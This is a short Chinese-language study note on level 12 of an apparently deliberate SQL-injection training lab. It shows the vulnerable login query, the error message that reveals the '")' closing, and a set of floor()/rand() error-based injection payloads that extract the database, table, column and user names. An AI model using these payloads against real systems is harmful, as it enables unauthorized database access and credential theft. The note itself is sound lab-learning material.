---
title: less12
url: https://www.yuque.com/u29002979/ep2zrx/ieg6hqs4seu4p47p
---

```bash
$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

`1"`

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") and password=("") LIMIT 0,1' at line 1

用**")**闭合
1")
与Less11的区别就是闭合方式的不一样，注入方式完全一样。 <a name="LDkbm"></a>

# 试试报错注入

之前用过了 extractvalue() 函数， updatexml()函数 ，现在试试 floor()函数&#x20;
`-1") union select count(*),concat(0x7e,database(),0x7e,**floor(rand(0)*2)**)x from information_schema.tables **group by x**-- +`

```bash
爆破数据库
-1") union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
爆破数据表
-1") union select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
爆破字段表
-1") union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
爆破字段
-1") union select count(*),concat(0x7e,(select username from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x-- +
```
